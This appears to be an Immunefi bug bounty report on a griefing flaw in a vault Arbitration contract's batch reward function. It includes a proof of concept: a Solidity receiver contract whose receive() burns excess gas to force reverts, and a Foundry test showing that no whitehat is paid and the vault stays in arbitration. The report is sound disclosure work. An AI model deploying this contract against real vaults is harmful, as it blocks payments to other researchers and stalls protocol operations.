# 29760 - \[SC - Insight] Enforcing Multiple Rewards During Arbitration B...

## Enforcing Multiple Rewards During Arbitration Bug Allows Malicious Whitehats to Grief Vaults Causing Large Unnecessary Gas Fees, Revert Payment to Benevolent Whitehats, and Leave Vault in Arbitration

Submitted on Apr 2nd 2024 at 11:57:11 UTC by @seinsidler for [Boost | Immunefi Arbitration](https://immunefi.com/bounty/immunefiarbitration-boost/)

Report ID: #29760

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/immunefi-team/vaults/blob/main/src/Arbitration.sol>

Impacts:

* Causes Vault to Stay in Arbitration
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

### Description

## Immunefi Arbitration Boost Bug Report

#### Background

Currently, the `VaultDelegate::sendReward` function utilizes a call from the whitehat address. `VaultDelegate::sendReward` allows the whitehat to create a smart contract to define a `receive` function to execute additional code when `VaultDelegate::sendReward` is executed. While the current system limits the gas fees each time `VaultDelegate::sendReward` is called, the `Arbitration::enforceMultipleRewards` allows for an array of whitehats to be paid at a time, utilizing a `for` loop of an array of addresses. And if a call exceeds the vault delegate's gas limit, the transaction reverts. This means that the larger the array of addresses passed to this function, the larger the gas fee will be. However, the combination of how `VaultDelegate::sendReward` and `Arbitration::enforceMultipleRewards` are set up, a whitehat could create a smart contract with a `receive` function that reverts `Arbitration::enforceMultipleRewards`.

Appropriate gas fees are applied when the transaction is called (up until the malicious whitehat's `receive` function), but the other whitehats in the array passed to `Arbitration::enforceMultipleRewards` will not be paid out, and the vault stays in arbitration. The size of the gas fees is dependent on the size of the array passed to `Arbitration::enforceMultipleRewards` and how far into the array the malicious whitehat's smart contract address is in the array passed.

#### Scenario

The following scenario describes how the griefing attack would go and the consequences of it:

1. Malicious whitehat creates and deploys a smart contract that implements the `receive` function that calls a function that would exceed the `UNTRUSTED_TARGET_GAS_CAP`.
2. Malcious whitehat submits the address of the deployed smart contract as their address for a bug bounty to a vault.
3. Vault goes into arbitration.
4. Arbiter sends multiple rewards with \`\`\` Arbitration::enforceMultipleRewards \`\` and includes the malicious whitehat's address of their smart contract in the array.
5. The transaction reverts. Gas is still paid on the transaction, and the gas fee depends on the index of the malicious whitehat's smart contract within the array passed.
6. No whitehat in the array, including the addresses indexed before the malicious smart contract address, receives payment.
7. The vault stays in arbitration, limiting the vault's capabilities.

### Recommendations

I would recommend not using `Arbitration::enforceMultipleReward` at all. Especially in a live mainnet environment, debugging which address is causing the revert can be hard. If multiple whitehats colluded to do this attack, it could take several failed calls of `Arbitration::enforceMultipleReward` before removing all malicious addresses in an array. Sending a single reward during the arbitration at a time still allows for a whitehat to make this attack, but the attack is way less effective because the function call does not have the potential of having a hefty gas fee associated, and the arbiter or vault can quickly identify the address causing the revert. If `Arbitration::enforceMultipleReward` is still a function necessary for arbitration, it might make sense to have checks on whitehat addresses to prevent them from being other smart contracts. This wouldn't allow any code execution to cause transactions to revert.

### Proof of concept

#### PoC

The following is a PoC of the attack described above. This test was based on `testArbSendsMultipleRewardsAndCloses` in `Arbitration.t.sol` with slight changes to execute the attack. The first code snippet is the contract of the malicious whitehat that has a `receive` function that gets called through the execution of `Arbitration::enforceMultipleRewards` (more specifically `VaultDelegate::sendReward` within this `Arbitration::enforceMultipleRewards`). A malicious whitehat could supply the address of this smart contract when deployed to do this griefing attack. The second code snippet is the test function that demonstrates the attack.

Attack Smart contract (Named `Receiver.sol`):

```solidity

pragma solidity ^0.8.18;
import {console} from "../lib/forge-std/src/console.sol";

contract Receiver {
    event Received(address caller, uint amount, string message);
    event SenderAddress(address sender);

    mapping(uint => uint) public values;

    // Function that consumes a lot of gas by writing to storage many times
    function consumeALotOfGas(uint numberOfWrites) public {
        for (uint i = 0; i < numberOfWrites; i++) {
            // Writing to storage is costly in terms of gas
            values[i] = i;
        }
    }
    // The receive function is called when Ether is sent to the contract with no data
    receive() external payable {
        // slither-disable-next-line arbitrary-send-eth,low-level-calls
        this.consumeALotOfGas(1000);
    }

    function logSender() external {
        emit SenderAddress(msg.sender);
    }

    // Function to check the contract's balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Test demonstrating the attack:

```solidity
    function testArbSendsMultipleRewardsGriefing() public {
        uint96 referenced = 1;

        address newRecipient = makeAddr("newRecipient");
        // length variable determines length of array passed to enforceMultipleRewards
        uint256 length = 10;
        address[] memory userGroup = new address[](length);
        for (uint256 i = 0; i < length; i++) {
            string memory number = Strings.toString(i);
            address name = makeAddr(string.concat("newRecipient", number));
            userGroup[i] = name;
        }
        Receiver receiver = new Receiver();
        ERC20PresetMinterPauser token = ERC20PresetMinterPauser(address(arbitration.feeToken()));

        vm.startPrank(protocolOwner);
        token.mint(whitehat, arbitration.feeAmount());
        vm.stopPrank();

        vm.startPrank(whitehat);
        token.approve(address(arbitration), arbitration.feeAmount());
        vm.stopPrank();

        // set right permissions on moduleGuard
        vm.startPrank(protocolOwner);
        moduleGuard.setTargetAllowed(address(vaultDelegate), true);
        moduleGuard.setAllowedFunction(address(vaultDelegate), vaultDelegate.sendTokens.selector, true);
        moduleGuard.setDelegateCallAllowedOnTarget(address(vaultDelegate), true);

        moduleGuard.setTargetAllowed(address(vaultDelegate), true);
        moduleGuard.setAllowedFunction(address(vaultDelegate), vaultDelegate.sendReward.selector, true);
        moduleGuard.setDelegateCallAllowedOnTarget(address(vaultDelegate), true);
        vm.stopPrank();

        // set role on a new recipient
        vm.startPrank(protocolOwner);
        for (uint256 i = 0; i < length; i++) {
            arbitration.grantRole(arbitration.ALLOWED_RECIPIENT_ROLE(), userGroup[i]);
            console.log("addresses: ", address(userGroup[i]));
        }        
        arbitration.grantRole(arbitration.ALLOWED_RECIPIENT_ROLE(), newRecipient);
        arbitration.grantRole(arbitration.ALLOWED_RECIPIENT_ROLE(), address(receiver));
        vm.stopPrank();

        bytes memory signature = _signData(
            whitehatPk,
            arbitration.encodeRequestArbFromWhitehatData(referenceId, address(vault))
        );

        vm.prank(whitehat);
        arbitration.requestArbWhitehat(referenceId, address(vault), whitehat, signature);
        vm.stopPrank();
        vm.deal(address(vault), 100 ether);
        vm.deal(address(receiver), 10 ether);
        ArbitrationBase.MultipleEnforcementElement[] memory rewards = new ArbitrationBase.MultipleEnforcementElement[](
            length+1
        );
        // The beginning of the array includes all the whitehats that don't initiate 
        // the attack
        for (uint256 i = 0; i < length; i++) {
            rewards[i] = ArbitrationBase.MultipleEnforcementElement({
                withFees: true,
                recipient: userGroup[i],
                tokenAmounts: new Rewards.ERC20Reward[](0),
                nativeTokenAmount: 1 ether,
                gasToTarget: vaultDelegate.UNTRUSTED_TARGET_GAS_CAP()
            });
        }
     
        // Then, the malicious whitehat is added at the end of the array to demonstrate 
        // the worst case scenario for the grief attack
        rewards[length] = ArbitrationBase.MultipleEnforcementElement({
            withFees: true,
            recipient: address(receiver),
            tokenAmounts: new Rewards.ERC20Reward[](0),
            nativeTokenAmount: 1 ether,
            gasToTarget: vaultDelegate.UNTRUSTED_TARGET_GAS_CAP()
        });
        bytes32 arbitrationId = arbitration.computeArbitrationId(referenceId, address(vault), whitehat);


        uint gasUsed;
 

        uint initialGas = gasleft();
        vm.txGasPrice(123456);

        vm.startPrank(arbiter);
        // We expect this enforceMultipleRewards because of the malicious whitehat's 
        // smart contract that causes the function to revert due to a function that
        // requires too much gas.
        vm.expectRevert();
        arbitration.enforceMultipleRewards(arbitrationId, rewards, true);
        vm.stopPrank();

        console.log("balance of random group member after: ", address(userGroup[0]).balance);
        uint finalGas = gasleft();
        gasUsed = initialGas - finalGas;
        console.log("Gas used: ", gasUsed);
        (, ArbitrationBase.ArbitrationStatus status, , , ) = arbitration.arbData(arbitrationId);
        console.log("status: ", uint256(status));
        console.log(uint256(ArbitrationBase.ArbitrationStatus.Open));

    }
```
